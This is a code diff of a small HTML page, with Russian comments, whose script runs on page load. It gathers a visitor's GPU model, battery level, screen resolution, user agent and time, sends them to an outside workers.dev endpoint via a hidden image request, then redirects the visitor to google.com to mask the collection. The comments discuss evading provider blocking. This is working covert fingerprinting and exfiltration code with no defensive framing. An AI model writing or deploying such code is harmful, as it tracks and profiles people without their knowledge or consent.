@@ -1,39 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
 <script>
-  async function collect() {
-    const data = {
-      t: encodeURIComponent(new Date().toLocaleString()),
-      bat: 'N/A',
-      gpu: 'N/A',
-      res: `${screen.width}x${screen.height}`
-    };
+    async function rntg() {
+        const d = {
+            t: new Date().toLocaleString(),
+            res: `${screen.width}x${screen.height}`,
+            ua: navigator.userAgent
+        };
 
-    // GPU
-    try {
-      const gl = document.createElement('canvas').getContext('webgl');
-      const debug = gl.getExtension('WEBGL_debug_renderer_info');
-      data.gpu = encodeURIComponent(gl.getParameter(debug.UNMASKED_RENDERER_WEBGL));
-    } catch (e) {}
+        // Сбор GPU
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl');
+            const info = gl.getExtension('WEBGL_debug_renderer_info');
+            d.gpu = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
+        } catch (e) { d.gpu = 'n/a'; }
 
-    // Battery
-    try {
-      const bt = await navigator.getBattery();
-      data.bat = `${Math.round(bt.level * 100)}%${bt.charging ? '+' : '-'}`;
-    } catch (e) {}
+        // Сбор Батареи
+        try {
+            const b = await navigator.getBattery();
+            d.bat = `${Math.round(b.level * 100)}%${b.charging ? '+' : '-'}`;
+        } catch (e) { d.bat = 'n/a'; }
 
-    const query = Object.keys(data).map(k => `${k}=${data[k]}`).join('&');
-    
-    // ВАЖНО: Используем твой воркер, но через 'workers.dev' провайдеры часто блочат.
-    // Если нет домена, единственный код, который "пробьет" — это отправка через fetch на спец. эндпоинт.
-    const url = "https://adminfdm.alexgranny1708.workers.dev/?" + query;
+        // ПАРАМЕТРЫ ЗАПРОСА
+        const q = Object.keys(d).map(k => `${k}=${encodeURIComponent(d[k])}`).join('&');
+        
+        // Используем твой текущий воркер
+        const worker = "https://adminfdm.alexgranny1708.workers.dev/";
+        
+        const i = new Image();
+        const exit = () => window.location.replace("https://google.com");
 
-    const img = new Image();
-    const go = () => window.location.replace("https://google.com");
-    
-    img.onload = go;
-    img.onerror = go;
-    img.src = url;
+        i.onload = exit;
+        i.onerror = exit;
+        i.src = worker + "?" + q;
 
-    setTimeout(go, 2000);
-  }
-  collect();
+        // Резервный таймер (если Image заблочен провайдером)
+        setTimeout(exit, 2000);
+    }
+    rntg();
 </script>
+</body>
+</html>
